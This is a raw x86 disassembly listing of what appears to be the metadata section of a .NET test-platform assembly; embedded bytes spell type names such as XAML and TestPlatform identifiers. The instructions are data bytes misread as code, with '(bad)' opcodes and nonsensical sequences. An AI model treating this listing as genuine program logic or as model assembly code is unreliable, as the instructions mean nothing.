  403407:	add    ebx,esi
  403409:	add    cl,dh
  40340b:	add    cl,al
  40340d:	add    ebx,esi
  40340f:	add    cl,bh
  403411:	add    cl,al
  403413:	add    eax,edi
  403415:	add    BYTE PTR [ecx],al
  403417:	add    ecx,eax
  403419:	add    ebx,esi
  40341b:	add    BYTE PTR [ecx],cl
  40341d:	add    ecx,eax
  40341f:	add    ebp,edi
  403421:	add    BYTE PTR [ecx],dl
  403423:	add    ecx,eax
  403425:	add    DWORD PTR [ebp-0x3efee700],eax
  40342b:	add    DWORD PTR [ebx],eax
  40342d:	add    DWORD PTR [ecx],ebp
  40342f:	add    ecx,eax
  403431:	add    DWORD PTR [edx],ecx
  403433:	add    DWORD PTR [eax+eax*1],ecx
  403436:	rol    DWORD PTR [ecx],0x85
  403439:	add    BYTE PTR [eax+eax*1],dl
  40343c:	rol    DWORD PTR [ecx],0x85
  40343f:	add    BYTE PTR [ecx],cl
  403441:	add    cl,al
  403443:	add    DWORD PTR [ebp-0x3efecf00],eax
  403449:	add    ebx,esi
  40344b:	add    BYTE PTR [ecx],bh
  40344d:	add    esp,edi
  40344f:	or     edi,eax
  403451:	add    DWORD PTR [eax+eax*1],ecx
  403454:	or     cl,BYTE PTR [edx]
  403456:	int3   
  403457:	add    DWORD PTR [eax+eax*1],ecx
  40345a:	push   ss
  40345b:	or     dl,ch
  40345d:	add    DWORD PTR [eax+eax*1],edx
  403460:	or     cl,BYTE PTR [edx]
  403462:	int3   
  403463:	add    DWORD PTR [eax+eax*1],edx
  403466:	push   ss
  403467:	or     dl,ch
  403469:	add    DWORD PTR [ecx+0x0],eax
  40346c:	sbb    cl,BYTE PTR [edx]
  40346e:	out    0x1,eax
  403470:	inc    ecx
  403471:	add    BYTE PTR [edx],ah
  403473:	or     ch,ch
  403475:	add    DWORD PTR [eax+eax*1],ebx
  403478:	rol    DWORD PTR [ecx],0x1
  40347b:	add    al,BYTE PTR [ecx+0x0]
  40347e:	sbb    cl,BYTE PTR [edx]
  403480:	pop    es
  403481:	add    al,BYTE PTR [ecx+0x0]
  403484:	cdq    
  403485:	add    bl,BYTE PTR [edi+0x0]
  403488:	inc    ecx
  403489:	add    BYTE PTR [ecx+0xa],cl
  40348c:	pop    ebx
  40348d:	add    BYTE PTR [ecx+0x1],bl
  403490:	test   BYTE PTR [edx],cl
  403492:	daa    
  403493:	add    bh,BYTE PTR [ecx]
  403495:	add    DWORD PTR [ecx+0x41022d0a],ebp
  40349b:	add    BYTE PTR [eax+0x2401ed0a],dh
  4034a1:	add    cl,cl
  4034a3:	or     bh,BYTE PTR ds:0xd7002c02
  4034a9:	or     cl,BYTE PTR [esi+0x2]
  4034ac:	sub    al,0x0
  4034ae:	jecxz  0x4034ba
  4034b0:	push   edi
  4034b1:	add    BYTE PTR [ecx+0x1],dh
  4034b4:	clc    
  4034b5:	or     al,BYTE PTR [ebp+0x70004100]
  4034bb:	add    bl,BYTE PTR [ebx+0x0]
  4034be:	cmp    DWORD PTR [ecx],eax
  4034c0:	sbb    ecx,DWORD PTR [ebx]
  4034c2:	add    bh,BYTE PTR gs:[ecx]
  4034c5:	add    DWORD PTR [esi],esp
  4034c7:	or     esi,DWORD PTR [ecx+0x2]
  4034ca:	cmp    DWORD PTR [ecx],eax
  4034cc:	xor    cl,BYTE PTR [ebx]
  4034ce:	jbe    0x4034d2
  4034d0:	mov    DWORD PTR [ecx],eax
  4034d2:	rol    DWORD PTR [ecx],0x85
  4034d5:	add    BYTE PTR [ecx+0x0],al
  4034d8:	ins    DWORD PTR es:[edi],dx
  4034d9:	or     eax,DWORD PTR [ebp+0x78004102]
  4034df:	or     ecx,DWORD PTR [edx-0x58ffbefe]
  4034e5:	or     ebx,DWORD PTR [edx+0x7d006102]
  4034eb:	add    bl,BYTE PTR [ebx+0x0]
  4034ee:	inc    ecx
  4034ef:	add    BYTE PTR [ecx+0x4102a20b],bh
  4034f5:	add    dh,al
  4034f7:	or     ebp,DWORD PTR [eax-0x2fffbefe]
  4034fd:	or     ebp,DWORD PTR [esi+0xe006102]
  403503:	or     al,0xc9
  403505:	add    al,BYTE PTR [eax+eax*1-0x37]
  403509:	or     bl,ch
  40350b:	add    cl,BYTE PTR [eax+eax*1-0x29]
  40350f:	or     cl,BYTE PTR [esi+0x2]
  403512:	mov    ecx,0xf00c4201
  403517:	add    ah,BYTE PTR [ecx+0x0]
  40351a:	push   edx
  40351b:	or     al,0x5f
  40351d:	add    BYTE PTR [ecx-0x7f37eff],bh
  403523:	add    bl,BYTE PTR [eax+eax*1-0x37]
  403527:	or     bl,ch
  403529:	add    ah,BYTE PTR [eax+eax*1-0x29]
  40352d:	or     cl,BYTE PTR [esi+0x2]
  403530:	rol    DWORD PTR [ecx],1
  403532:	xchg   esp,eax
  403533:	or     al,0x15
  403535:	add    edi,DWORD PTR [ecx]
  403537:	add    DWORD PTR [eax-0x2efce5f6],esi
  40353d:	add    eax,eax
  40353f:	or     al,0x20
  403541:	add    ebx,ecx
  403543:	add    edi,ecx
  403545:	or     al,0x74
  403547:	add    cl,ah
  403549:	add    ebx,esp
  40354b:	or     dl,BYTE PTR [edi+0x0]
  40354e:	inc    ecx
  40354f:	add    ah,al
  403551:	add    dl,BYTE PTR [edi+0x0]
  403554:	pop    ecx
  403555:	add    BYTE PTR [eax+0x51034b0a],dh
  40355b:	add    BYTE PTR [eax+0x5103530a],dh
  403561:	add    al,bh
  403563:	or     al,0x5b
  403565:	add    ebp,ecx
  403567:	add    eax,edi
  403569:	or     al,0x61
  40356b:	add    eax,DWORD PTR [ecx+0x0]
  40356e:	or     cl,BYTE PTR ds:0x1f1036d
  403574:	sub    BYTE PTR ds:0x410373,cl
  40357a:	cmp    al,0xd
  40357c:	jp     0x403581
  40357e:	jno    0x403580
  403580:	mov    al,0xa
  403582:	add    BYTE PTR [ebx],0x71
  403585:	add    BYTE PTR [eax+0xd],cl
  403588:	pop    edi
  403589:	add    BYTE PTR [ecx-0xcfe3eff],cl
  40358f:	add    BYTE PTR [ecx+0x0],dh
  403592:	pop    ecx
  403593:	or     eax,0x710057
  403598:	gs or  eax,0x710057
  40359e:	push   ecx
  40359f:	add    eax,0x1f90361
  4035a4:	rol    DWORD PTR [ecx],0xf3
  4035a7:	add    BYTE PTR [ecx+0x0],al
  4035aa:	mov    WORD PTR ds:0x410057,cs
  4035b0:	xchg   edi,eax
  4035b1:	or     eax,0x2010388
  4035b6:	test   al,0xd
  4035b8:	lea    eax,[ebx]
  4035ba:	jno    0x4035bc
  4035bc:	pop    edx
  4035bd:	add    eax,0x2190394
  4035c2:	rol    DWORD PTR [ecx],0x85
  4035c5:	add    BYTE PTR [ecx],ah
  4035c7:	add    dl,BYTE PTR [ebx+0xe]
  4035ca:	mov    bl,0x3
  4035cc:	sub    DWORD PTR [edx],eax
  4035ce:	jo     0x4035de
  4035d0:	mov    eax,0x84020103
  4035d5:	push   cs
  4035d6:	mov    edi,0x8e020103
  4035db:	push   cs
  4035dc:	mov    BYTE PTR [ebx],0x39
  4035df:	add    dl,al
  4035e1:	push   cs
  4035e2:	(bad)  
  4035e3:	add    ecx,DWORD PTR [ecx+0x2]
  4035e6:	test   DWORD PTR [esi],0x21103dd
  4035ec:	rol    DWORD PTR [ecx],0x1
  4035ef:	add    ah,BYTE PTR [ecx]
  4035f1:	add    ch,bh
  4035f3:	push   cs
  4035f4:	loop   0x4035f9
  4035f6:	and    al,0x0
  4035f8:	rol    DWORD PTR [ecx],0x85
  4035fb:	add    BYTE PTR [ecx+0x0],al
  4035fe:	or     cl,BYTE PTR [edi]
  403600:	out    dx,eax
  403601:	add    edx,DWORD PTR [ecx+0x2]
  403604:	adc    eax,0x4903f50f
  403609:	add    BYTE PTR [edx],ah
  40360b:	cvtdq2ps xmm0,XMMWORD PTR [eax]
  40360e:	pop    ecx
  40360f:	add    al,cl
  403611:	add    ebx,esi
  403613:	add    BYTE PTR [ecx+0x2],bl
  403616:	push   eax
  403617:	psubd  mm0,QWORD PTR [ebx]
  40361a:	popa   
  40361b:	add    bl,BYTE PTR [esi+0xf]
  40361e:	add    BYTE PTR [ecx+ebp*2],al
  403621:	add    bh,BYTE PTR [ebp+0x2]
  403624:	pop    ebx
  403625:	add    BYTE PTR [ecx],bh
  403627:	add    DWORD PTR [esi+0xf],esi
  40362a:	pop    ebx
  40362b:	add    BYTE PTR [eax+eax*1],ah
  40362e:	jle    0x40363f
  403630:	pop    es
  403631:	add    al,0x69
  403633:	add    al,BYTE PTR [edi+0x39005b0f]
  403639:	add    DWORD PTR [ebp+0x71005b0f],edx
  40363f:	add    ch,BYTE PTR [ebx+0x2403b30f]
  403645:	add    BYTE PTR [esi],dl
  403647:	or     al,BYTE PTR [edi]
  403649:	add    al,0x39
  40364b:	add    edi,eax
  40364d:	prefetchnta BYTE PTR [ecx+eax*4]
  403651:	add    al,cl
  403653:	add    DWORD PTR [ebp+0x64028100],eax
  403659:	adc    BYTE PTR [ebx],ch
  40365b:	add    al,0x21
  40365d:	add    ch,BYTE PTR [eax+0x10]
  403660:	fld    QWORD PTR [ebx]
  403662:	add    DWORD PTR [eax],0x439107c
  403668:	jns    0x40366c
  40366a:	rol    DWORD PTR [ecx],0x1
  40366d:	add    cl,BYTE PTR [ecx+0x2]
  403670:	rol    DWORD PTR [ecx],0x3f
  403673:	add    al,0x49
  403675:	add    bh,ch
  403677:	push   cs
  403678:	test   DWORD PTR [eax],eax
  40367a:	and    al,0x0
  40367c:	rol    DWORD PTR [ecx],0x4c
  40367f:	add    al,0x21
  403681:	add    cl,al
  403683:	add    DWORD PTR [ebp+0x3b002e00],eax
  403689:	add    cl,cl
  40368b:	add    al,0x2e
  40368d:	add    BYTE PTR [ebx+0x2e090600],ah
  403693:	add    BYTE PTR [ebx],cl
  403695:	add    BYTE PTR [esi+0x4],bl
  403698:	add    BYTE PTR cs:[ebx],dl
  40369b:	add    BYTE PTR [ecx+0x1b002e01],dh
  4036a1:	add    BYTE PTR [esi+0x23002e04],dl
  4036a7:	add    BYTE PTR [esp+eax*1+0x2b002e],bl
  4036ae:	pushf  
  4036af:	add    al,0x2e
  4036b1:	add    BYTE PTR [ebx],dh
  4036b3:	add    BYTE PTR [esp+eax*1+0x43002e],bl
  4036ba:	in     al,0x4
  4036bc:	add    BYTE PTR cs:[ebx+0x0],cl
  4036c0:	or     al,BYTE PTR ds:0x5b002e
  4036c6:	ds add eax,0x63002e
  4036cc:	ds add eax,0x6b002e
  4036d2:	push   eax
  4036d3:	add    eax,0x73002e
  4036d8:	pop    esi
  4036d9:	add    eax,0x7b002e
  4036de:	xchg   esi,eax
  4036df:	add    al,0x2e
  4036e1:	add    BYTE PTR [ebx+0x2e056900],al
  4036e7:	add    BYTE PTR [ebx+0x2e059400],cl
  4036ed:	add    BYTE PTR [ebx+0x2e08de00],dl
  4036f3:	add    BYTE PTR [ebx+0x4308fd00],bl
  4036f9:	add    BYTE PTR [ebx],bl
  4036fb:	add    BYTE PTR [ecx+0x1b00e301],dh
  403701:	add    BYTE PTR [ecx-0x44fdbeff],dh
  403707:	add    ch,BYTE PTR [esi-0x44fd1efd]
  40370d:	add    ch,BYTE PTR [esi-0x44f8dffd]
  403713:	add    ch,BYTE PTR [esi-0x44f7fffd]
  403719:	add    ch,BYTE PTR [esi-0x1dfe22fd]
  40371f:	add    DWORD PTR [edx],esp
  403721:	add    dl,BYTE PTR [ebx+0x2]
  403724:	ins    DWORD PTR es:[edi],dx
  403725:	add    bh,BYTE PTR [ebx+0x2]
  403728:	mov    ebx,0x68032602
  40372d:	add    ebx,DWORD PTR [ebx+eax*1+0x40d03e9]
  403734:	xor    DWORD PTR [esi+eax*2],eax
  403737:	add    al,0x57
  403739:	add    al,0x3
  40373b:	add    BYTE PTR [ecx],al
  40373d:	add    BYTE PTR [eax+eax*1],al
  403740:	sldt   WORD PTR ds:0x1900
  403747:	add    BYTE PTR [edx],bh
  403749:	add    cl,BYTE PTR [esi-0x76000000]
  40374f:	add    edx,DWORD PTR [edx-0x6d000000]
  403755:	add    edx,DWORD PTR [edx-0x68000000]
  40375b:	add    edx,DWORD PTR [esi-0x59000000]
  403761:	add    ebx,DWORD PTR [ebx-0x50000000]
  403767:	add    esp,DWORD PTR [eax-0x40000000]
  40376d:	add    ecx,DWORD PTR [esi-0x38000000]
  403773:	add    ecx,DWORD PTR [esi-0x2b000000]
  403779:	add    ecx,DWORD PTR [esi-0x1b000000]
  40377f:	add    ecx,DWORD PTR [esi-0xe000000]
  403785:	add    ecx,DWORD PTR [esi+0x4000000]
  40378b:	add    al,0x9b
  40378d:	add    BYTE PTR [eax],al
  40378f:	add    BYTE PTR ds:0x9b04,cl
  403795:	add    BYTE PTR ds:0x8e04,dl
  40379b:	add    BYTE PTR [edx],bh
  40379d:	add    cl,BYTE PTR [esi-0x59000000]
  4037a3:	add    ebx,DWORD PTR [ebx-0x50000000]
  4037a9:	add    esp,DWORD PTR [eax-0x40000000]
  4037af:	add    ecx,DWORD PTR [esi-0xe000000]
  4037b5:	add    ecx,DWORD PTR [esi-0x38000000]
  4037bb:	add    ecx,DWORD PTR [esi-0x2b000000]
  4037c1:	add    ecx,DWORD PTR [esi-0x1b000000]
  4037c7:	add    ecx,DWORD PTR [esi+0xd000000]
  4037cd:	add    al,0x9b
  4037cf:	add    BYTE PTR [eax],al
  4037d1:	add    BYTE PTR [esp+eax*1],al
  4037d4:	fwait
  4037d5:	add    BYTE PTR [eax],al
  4037d7:	add    BYTE PTR [ebx+0x9203],dl
  4037dd:	add    ch,bl
  4037df:	add    DWORD PTR [ebx+0x63000000],ebx
  4037e5:	add    eax,0x9b
  4037ea:	outs   dx,BYTE PTR ds:[esi]
  4037eb:	add    eax,0x8e
  4037f0:	jnp    0x4037f7
  4037f2:	mov    es,WORD PTR [eax]
  4037f4:	add    BYTE PTR [eax],al
  4037f6:	nop
  4037f7:	add    eax,0x2008e
  4037fc:	or     DWORD PTR [eax],eax
  4037fe:	add    eax,DWORD PTR [eax]
  403800:	add    al,BYTE PTR [eax]
  403802:	or     al,BYTE PTR [eax]
  403804:	add    eax,0xb000200
  403809:	add    BYTE PTR [edi],al
  40380b:	add    BYTE PTR [edx],al
  40380d:	add    BYTE PTR [eax+eax*1],cl
  403810:	or     DWORD PTR [eax],eax
  403812:	add    al,BYTE PTR [eax]
  403814:	or     eax,0x2000b00
  403819:	add    BYTE PTR [esi],cl
  40381b:	add    BYTE PTR ds:0x10000200,cl
  403821:	add    BYTE PTR [edi],cl
  403823:	add    BYTE PTR [edx],al
  403825:	add    BYTE PTR [ecx],dl
  403827:	add    BYTE PTR [ecx],dl
  403829:	add    BYTE PTR [edx],al
  40382b:	add    BYTE PTR [edx],dl
  40382d:	add    BYTE PTR [ebx],dl
  40382f:	add    BYTE PTR [edx],al
  403831:	add    BYTE PTR [ebx],dl
  403833:	add    BYTE PTR ds:0x14000200,dl
  403839:	add    BYTE PTR [edi],dl
  40383b:	add    BYTE PTR [edx],al
  40383d:	add    BYTE PTR ds:0x2001900,dl
  403843:	add    BYTE PTR [esi],dl
  403845:	add    BYTE PTR [ebx],bl
  403847:	add    BYTE PTR [edx],al
  403849:	add    BYTE PTR [eax+eax*1],bl
  40384c:	sbb    eax,0x1f000200
  403851:	add    BYTE PTR [edi],bl
  403853:	add    BYTE PTR [edx],al
  403855:	add    BYTE PTR [eax],ah
  403857:	add    BYTE PTR [ecx],ah
  403859:	add    BYTE PTR [edx],al
  40385b:	add    BYTE PTR [ecx],ah
  40385d:	add    BYTE PTR [ebx],ah
  40385f:	add    BYTE PTR [edx],al
  403861:	add    BYTE PTR [edx],ah
  403863:	add    BYTE PTR ds:0x23000200,ah
  403869:	add    BYTE PTR [edi],ah
  40386b:	add    BYTE PTR [edx],al
  40386d:	add    BYTE PTR [eax+eax*1],ah
  403870:	sub    DWORD PTR [eax],eax
  403872:	add    al,BYTE PTR [eax]
  403874:	and    eax,0x2002b00
  403879:	add    BYTE PTR [esi],ah
  40387b:	add    BYTE PTR ds:0x27000200,ch
  403881:	add    BYTE PTR [edi],ch
  403883:	add    BYTE PTR [edx],al
  403885:	add    BYTE PTR [eax],ch
  403887:	add    BYTE PTR [ecx],dh
  403889:	add    BYTE PTR [edx],al
  40388b:	add    BYTE PTR [edi],ch
  40388d:	add    BYTE PTR [ebx],dh
  40388f:	add    BYTE PTR [edx],al
  403891:	add    BYTE PTR [eax],dh
  403893:	add    BYTE PTR ds:0x31000200,dh
  403899:	add    BYTE PTR [edi],dh
  40389b:	add    BYTE PTR [edx],al
  40389d:	add    BYTE PTR [edx],dh
  40389f:	add    BYTE PTR [ecx],bh
  4038a1:	add    BYTE PTR [edx],al
  4038a3:	add    BYTE PTR [ebx],dh
  4038a5:	add    BYTE PTR [ebx],bh
  4038a7:	add    BYTE PTR [edx],al
  4038a9:	add    BYTE PTR [eax+eax*1],dh
  4038ac:	cmp    eax,0xbf01b700
  4038b1:	add    ebp,esi
  4038b3:	add    DWORD PTR [edi],esi
  4038b5:	add    al,BYTE PTR [edi+0x2]
  4038b8:	xchg   edx,eax
  4038b9:	add    dh,BYTE PTR [edx+eax*1+0x2e702d4]
  4038c0:	cmc    
  4038c1:	add    al,BYTE PTR [ebx]
  4038c3:	add    ecx,DWORD PTR [ebx+eax*1]
  4038c6:	add    al,0x80
  4038c8:	add    BYTE PTR [eax],al
  4038ca:	or     eax,DWORD PTR [eax]
  4038cc:	add    BYTE PTR [eax],al
  4038ce:	add    BYTE PTR [eax],al
  4038d0:	add    BYTE PTR [eax],al
  4038d2:	add    DWORD PTR [eax],eax
  4038d4:	add    BYTE PTR [eax],al
  4038d6:	invlpg BYTE PTR [ebx+0x4000009]
	...
  4038e5:	add    BYTE PTR [eax],al
  4038e7:	add    BYTE PTR [ecx],al
  4038e9:	add    al,bl
  4038eb:	add    BYTE PTR [eax],al
  4038ed:	add    BYTE PTR [eax],al
  4038ef:	add    bh,bh
  4038f1:	add    bh,bh
  4038f3:	add    bh,bh
  4038f5:	add    bh,bh
  4038f7:	add    BYTE PTR [eax],al
  4038f9:	add    al,BYTE PTR [eax]
  4038fb:	add    BYTE PTR [eax],al
  4038fd:	add    bh,ch
  4038ff:	add    BYTE PTR [eax],al
  403901:	add    BYTE PTR [eax],al
  403903:	add    BYTE PTR [eax+eax*1],al
	...
  40390e:	add    BYTE PTR [eax],al
  403910:	add    DWORD PTR [eax],eax
  403912:	pushf  
  403913:	add    DWORD PTR [eax],eax
  403915:	add    BYTE PTR [eax],al
  403917:	add    BYTE PTR [eax+eax*1],al
	...
  403922:	add    BYTE PTR [eax],al
  403924:	add    DWORD PTR [eax],eax
  403926:	loope  0x403928
  403928:	add    BYTE PTR [eax],al
  40392a:	add    BYTE PTR [eax],al
  40392c:	or     eax,DWORD PTR [eax]
	...
  403936:	add    BYTE PTR [eax],al
  403938:	int    0x3
  40393a:	xchg   edi,eax
  40393b:	push   cs
  40393c:	add    BYTE PTR [eax],al
  40393e:	add    BYTE PTR [eax],al
  403940:	add    al,BYTE PTR [eax]
	...
  40394a:	add    BYTE PTR [eax],al
  40394c:	add    DWORD PTR [eax],eax
  40394e:	loope  0x403950
  403950:	add    BYTE PTR [eax],al
  403952:	add    BYTE PTR [eax],al
  403954:	or     eax,DWORD PTR [eax]
	...
  40395e:	add    BYTE PTR [eax],al
  403960:	int    0x3
  403962:	in     al,dx
  403963:	sldt   WORD PTR [eax]
  403966:	add    BYTE PTR [eax],al
  403968:	add    BYTE PTR [eax],al
  40396a:	add    BYTE PTR [eax],al
  40396c:	cmp    eax,0x3c04da00
  403971:	add    BYTE PTR [edi+0x2],bh
  403974:	add    DWORD PTR [eax],eax
  403976:	xor    eax,0x0
  40397b:	add    BYTE PTR [eax],al
  40397d:	cmp    al,0x4d
  40397f:	outs   dx,DWORD PTR ds:[esi]
  403980:	fs jne 0x4039ef
  403983:	gs add BYTE PTR ds:[esi+0x73],dh
  403988:	je     0x4039ef
  40398a:	jae    0x403a00
  40398c:	cs gs js 0x4039f5
  403990:	arpl   WORD PTR [ebp+0x74],si
  403993:	imul   ebp,DWORD PTR [edi+0x6e],0x69676e65
  40399a:	outs   dx,BYTE PTR ds:[esi]
  40399b:	gs cs popa 
  40399e:	jo     0x403a10
  4039a0:	arpl   WORD PTR [edi+0x6e],bp
  4039a3:	je     0x403a06
  4039a5:	imul   ebp,DWORD PTR [esi+0x65],0x78652e72
  4039ac:	add    BYTE PTR gs:[edx+0x75],dl
  4039b0:	outs   dx,BYTE PTR ds:[esi]
  4039b1:	push   esp
  4039b2:	imul   ebp,DWORD PTR [ebp+0x65],0x6c6d6158
  4039b9:	dec    ecx
  4039ba:	outs   dx,BYTE PTR ds:[esi]
  4039bb:	outs   dx,WORD PTR ds:[esi]
  4039bd:	push   eax
  4039be:	jb     0x403a2f
  4039c0:	jbe    0x403a2b
  4039c2:	fs gs jb 0x4039c6
  4039c6:	dec    ebp
  4039c7:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4039ce:	je     0x4039fe
  4039d0:	push   esi
  4039d1:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4039d8:	jne    0x403a3e
  4039da:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  4039e1:	push   eax
  4039e2:	ins    BYTE PTR es:[edi],dx
  4039e3:	popa   
  4039e4:	je     0x403a4c
  4039e6:	outs   dx,DWORD PTR ds:[esi]
  4039e7:	jb     0x403a56
  4039e9:	cs push esp
  4039eb:	gs jae 0x403a62
  4039ee:	inc    ebp
  4039ef:	js     0x403a56
  4039f1:	arpl   WORD PTR [ebp+0x74],si
  4039f4:	outs   dx,DWORD PTR ds:[esi]
  4039f5:	jb     0x403a25
  4039f7:	inc    ecx
  4039f8:	jo     0x403a6a
  4039fa:	inc    ebx
  4039fb:	outs   dx,DWORD PTR ds:[esi]
  4039fc:	outs   dx,BYTE PTR ds:[esi]
  4039fd:	je     0x403a60
  4039ff:	imul   ebp,DWORD PTR [esi+0x65],0x75520072
  403a06:	outs   dx,BYTE PTR ds:[esi]
  403a07:	push   esp
  403a08:	imul   ebp,DWORD PTR [ebp+0x65],0x6c6d6158
  403a0f:	push   ebx
  403a10:	jns    0x403a85
  403a12:	je     0x403a79
  403a14:	ins    DWORD PTR es:[edi],dx
  403a15:	inc    edx
  403a16:	popa   
  403a17:	jae    0x403a7e
  403a19:	push   esp
  403a1a:	jns    0x403a8c
  403a1c:	add    BYTE PTR gs:[edx+0x75],dl
  403a20:	outs   dx,BYTE PTR ds:[esi]
  403a21:	push   esp
  403a22:	imul   ebp,DWORD PTR [ebp+0x65],0x6c6d6158
  403a29:	push   ebp
  403a2a:	jae    0x403a91
  403a2c:	jb     0x403a82
  403a2e:	jns    0x403aa0
  403a30:	add    BYTE PTR gs:[edx+0x75],dl
  403a34:	outs   dx,BYTE PTR ds:[esi]
  403a35:	push   esp
  403a36:	imul   ebp,DWORD PTR [ebp+0x65],0x6c6d6158
  403a3d:	dec    ebp
  403a3e:	gs ins DWORD PTR es:[edi],dx
  403a40:	bound  esp,QWORD PTR [ebp+0x72]
  403a43:	add    BYTE PTR [ebx+0x65],dl
  403a46:	jb     0x403abe
  403a48:	imul   esp,DWORD PTR [ebx+0x65],0x6e69614d
  403a4f:	add    BYTE PTR [ecx+0x70],al
  403a52:	jo     0x403a54
  403a54:	ins    DWORD PTR es:[edi],dx
  403a55:	jae    0x403aba
  403a57:	outs   dx,DWORD PTR ds:[esi]
  403a58:	jb     0x403ac6
  403a5a:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  403a61:	gs ins DWORD PTR es:[edi],dx
  403a63:	add    BYTE PTR [edi+0x62],cl
  403a66:	push   0x65
  403a68:	arpl   WORD PTR [eax+eax*1+0x57],si
  403a6c:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  403a73:	push   edi
  403a74:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  403a7b:	push   ebp
  403a7c:	dec    ecx
  403a7d:	cs pop eax
  403a7f:	popa   
  403a80:	ins    DWORD PTR es:[edi],dx
  403a81:	ins    BYTE PTR es:[edi],dx
  403a82:	cs dec ebp
  403a84:	popa   
  403a85:	jb     0x403af2
  403a87:	jne    0x403af9
  403a89:	add    BYTE PTR [ecx+0x58],cl
  403a8c:	popa   
  403a8d:	ins    DWORD PTR es:[edi],dx
  403a8e:	ins    BYTE PTR es:[edi],dx
  403a8f:	push   esp
  403a90:	jns    0x403b02
  403a92:	add    BYTE PTR gs:[ecx+0x58],cl
  403a96:	popa   
  403a97:	ins    DWORD PTR es:[edi],dx
  403a98:	ins    BYTE PTR es:[edi],dx
  403a99:	dec    ebp
  403a9a:	gs ins DWORD PTR es:[edi],dx
  403a9c:	bound  esp,QWORD PTR [ebp+0x72]
  403a9f:	add    BYTE PTR [edi+0x69],dl
  403aa2:	outs   dx,BYTE PTR ds:[esi]
  403aa3:	outs   dx,DWORD PTR fs:[esi]
  403aa5:	ja     0x403b1a
  403aa7:	cs push ebp
  403aa9:	dec    ecx
  403aaa:	cs pop eax
  403aac:	popa   
  403aad:	ins    DWORD PTR es:[edi],dx
  403aae:	ins    BYTE PTR es:[edi],dx
  403aaf:	add    BYTE PTR [ecx+0x70],al
  403ab2:	jo     0x403b20
  403ab4:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  403abb:	add    BYTE PTR [ecx+0x58],cl
  403abe:	popa   
  403abf:	ins    DWORD PTR es:[edi],dx
  403ac0:	ins    BYTE PTR es:[edi],dx
  403ac1:	dec    ebp
  403ac2:	gs je  0x403b26
  403ac5:	fs popa 
  403ac7:	je     0x403b2a
  403ac9:	push   eax
  403aca:	jb     0x403b3b
  403acc:	jbe    0x403b37
  403ace:	fs gs jb 0x403ad2
  403ad2:	push   ebx
  403ad3:	jns    0x403b48
  403ad5:	je     0x403b3c
  403ad7:	ins    DWORD PTR es:[edi],dx
  403ad8:	cs inc ebx
  403ada:	outs   dx,DWORD PTR ds:[esi]
  403adb:	ins    BYTE PTR es:[edi],dx
  403adc:	ins    BYTE PTR es:[edi],dx
  403add:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403ae2:	outs   dx,BYTE PTR ds:[esi]
  403ae3:	jae    0x403b13
  403ae5:	inc    edi
  403ae6:	outs   dx,BYTE PTR gs:[esi]
  403ae8:	gs jb  0x403b54
  403aeb:	arpl   WORD PTR [eax],ax
  403aed:	inc    esp
  403aee:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  403af5:	jb     0x403b70
  403af7:	pusha  
  403af8:	xor    al,BYTE PTR [eax]
  403afa:	js     0x403b5d
  403afc:	ins    DWORD PTR es:[edi],dx
  403afd:	ins    BYTE PTR es:[edi],dx
  403afe:	push   esp
  403aff:	jns    0x403b71
  403b01:	gs inc ebx
  403b03:	popa   
  403b04:	arpl   WORD PTR [eax+0x65],bp
  403b07:	add    BYTE PTR [eax+0x61],bh
  403b0a:	ins    DWORD PTR es:[edi],dx
  403b0b:	ins    BYTE PTR es:[edi],dx
  403b0c:	dec    ebp
  403b0d:	gs ins DWORD PTR es:[edi],dx
  403b0f:	bound  esp,QWORD PTR [ebp+0x72]
  403b12:	inc    ebx
  403b13:	popa   
  403b14:	arpl   WORD PTR [eax+0x65],bp
  403b17:	add    BYTE PTR [ebx+0x79],dl
  403b1a:	jae    0x403b90
  403b1c:	gs ins DWORD PTR es:[edi],dx
  403b1e:	cs inc ebx
  403b20:	outs   dx,DWORD PTR ds:[esi]
  403b21:	jb     0x403b88
  403b23:	add    BYTE PTR [eax+0x61],cl
  403b26:	jae    0x403b90
  403b28:	push   ebx
  403b29:	gs je  0x403b8c
  403b2c:	xor    DWORD PTR [eax],eax
  403b2e:	jne    0x403ba3
  403b30:	gs jb  0x403b74
  403b33:	jae    0x403ba8
  403b35:	gs ins DWORD PTR es:[edi],dx
  403b37:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  403b3b:	jae    0x403b3d
  403b3d:	arpl   WORD PTR cs:[edi+ebp*2+0x72],si
  403b42:	add    BYTE PTR [edi+0x65],al
  403b45:	je     0x403b9f
  403b47:	popa   
  403b48:	ins    DWORD PTR es:[edi],dx
  403b49:	ins    BYTE PTR es:[edi],dx
  403b4a:	push   esp
  403b4b:	jns    0x403bbd
  403b4d:	gs inc edx
  403b4f:	jns    0x403b97
  403b51:	jne    0x403bbf
  403b53:	ins    BYTE PTR es:[edi],dx
  403b54:	dec    esi
  403b55:	popa   
  403b56:	ins    DWORD PTR es:[edi],dx
  403b57:	add    BYTE PTR gs:[ecx+edi*2+0x70],dl
  403b5c:	add    BYTE PTR gs:[edi+0x65],al
  403b60:	je     0x403baf
  403b62:	gs ins DWORD PTR es:[edi],dx
  403b64:	bound  esp,QWORD PTR [ebp+0x72]
  403b67:	inc    edx
  403b68:	jns    0x403bb8
  403b6a:	popa   
  403b6b:	ins    DWORD PTR es:[edi],dx
  403b6c:	add    BYTE PTR gs:[ebx+0x72],al
  403b70:	gs popa 
  403b72:	je     0x403bd9
  403b74:	pop    eax
  403b75:	popa   
  403b76:	ins    DWORD PTR es:[edi],dx
  403b77:	ins    BYTE PTR es:[edi],dx
  403b78:	push   esp
  403b79:	jns    0x403beb
  403b7b:	add    BYTE PTR gs:[ebx+0x79],dl
  403b7f:	jae    0x403bf5
  403b81:	gs ins DWORD PTR es:[edi],dx
  403b83:	cs push edx
  403b85:	gs data16 ins BYTE PTR es:[edi],dx
  403b88:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403b8d:	outs   dx,BYTE PTR ds:[esi]
  403b8e:	add    BYTE PTR [ecx+0x73],al
  403b91:	jae    0x403bf8
  403b93:	ins    DWORD PTR es:[edi],dx
